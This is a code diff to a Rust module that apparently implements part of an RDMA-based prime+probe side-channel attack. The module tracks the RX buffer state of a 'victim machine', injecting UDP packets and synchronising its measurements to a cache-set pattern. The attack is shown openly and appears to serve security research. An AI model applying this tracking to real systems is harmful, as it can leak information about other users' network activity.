@@ -2,23 +2,25 @@
 //! This module is responsible for tracking and gathering measurements on the state
 //! of the RX buffer of the victim machine.
 
+mod pattern;
 mod tracking;
 
 use crate::connection::rdma;
-use crate::rpp::{self, ColorCode, ColoredSetCode, SetCode};
+use crate::rpp::{ColorCode, ColoredSetCode, Rpp, SetCode};
+use pattern::{Pattern, PatternIdx};
 use std::collections::HashMap;
 use std::io::Result;
 use std::io::{Error, ErrorKind};
 use std::net::{ToSocketAddrs, UdpSocket};
-use tracking::{SyncStatus, TrackingContext, WINDOW_SIZE};
+use tracking::{SyncStatus, TrackingContext};
 
 const REPEATINGS: usize = 8;
 const MEASUREMENT_CNT: usize = 10000;
-
-pub type Pattern = Vec<SetCode>;
+const PROBABILITY: f64 = 0.8;
+const MAX_FAIL_CNT: usize = 100;
 
 pub struct OnlineTracker {
-    rpp: rpp::Rpp,
+    rpp: Rpp,
     sock: UdpSocket,
     pattern: Pattern,
 }
@@ -29,7 +31,7 @@ impl OnlineTracker {
     /// address is unapropriet for connecting to.  
     pub fn new<A: ToSocketAddrs + Clone>(addr: A) -> Result<OnlineTracker> {
         let conn = Box::new(rdma::RdmaServerConnector::new(addr.clone()));
-        let rpp = rpp::Rpp::new(conn);
+        let rpp = Rpp::new(conn);
         let sock = UdpSocket::bind("127.0.0.1:9009")?;
         sock.connect(addr)?;
         sock.set_nonblocking(true)?;
@@ -82,6 +84,33 @@ impl OnlineTracker {
         self.pattern = Self::find_pattern(patterns)?;
 
         Ok(())
+    }
+
+    fn get_init_pos(&mut self) -> Result<PatternIdx> {
+        let mut err_cnt = 0;
+
+        loop {
+            if err_cnt >= MAX_FAIL_CNT {
+                return Err(Error::new(
+                    ErrorKind::Other,
+                    "ERROR: Cannot determine the initial position in RX",
+                ));
+            }
+            if self.rpp.prime(&self.pattern[0]).is_err() {
+                err_cnt += 1;
+                continue;
+            }
+            if self.send_packet().is_err() {
+                err_cnt += 1;
+                continue;
+            }
+            match self.rpp.probe(&self.pattern[0]) {
+                Ok(Some(_)) => break,
+                Err(_) => err_cnt += 1,
+                _ => continue,
+            }
+        }
+        Ok(0)
     }
 
     #[inline(always)]
@@ -163,14 +192,35 @@ impl OnlineTracker {
 
     fn measure(&mut self) -> Result<()> {
         let init_pos = self.get_init_pos()?;
-        let mut ctx = TrackingContext::new(init_pos);     
+        let mut ctx = TrackingContext::new(init_pos);
+        let mut probe_res = Default::default();
 
         for _ in 0..MEASUREMENT_CNT {
-            let es = self.window(&ctx);
+            let es = self.pattern.window(ctx.pos()).copied().collect();
             self.rpp.prime_all(&es)?;
 
-            // TODO: measure
-        } 
+            loop {
+                if ctx.should_inject() {
+                    self.send_packet()?;
+                    ctx.inject();
+                }
+                probe_res = self.rpp.probe_all(&es)?;
+                if Rpp::is_activated(&probe_res) || ctx.is_injected() {
+                    break;
+                }
+            }
+
+            if Rpp::is_activated(&probe_res) && ctx.is_injected() {
+                ctx.sync_hit(self.pattern.next_pos(ctx.pos()));
+            } else if ctx.is_injected() {
+                ctx.sync_miss(self.pattern.recover_next(ctx.pos(), &probe_res)?);
+            } else {
+                ctx.unsynced_meaurement();
+            }
+
+            // self.save(&probe_res, &ctx);
+        }
+        Ok(())
     }
 }
 
@@ -215,12 +265,13 @@ mod tests {
             None,
         ];
 
-        let expected = vec![SetCode(0, 1), SetCode(0, 2), SetCode(0, 3), SetCode(0, 4)];
+        let expected: Pattern =
+            vec![SetCode(0, 1), SetCode(0, 2), SetCode(0, 3), SetCode(0, 4)].into();
 
         let mut hm = HashMap::new();
         hm.insert(0, measurements);
 
         let pattern = OnlineTracker::find_pattern(hm).expect("No pattern found");
         assert_eq!(expected, pattern, "The pattern is incorrect");
-    }
+    }    
 }
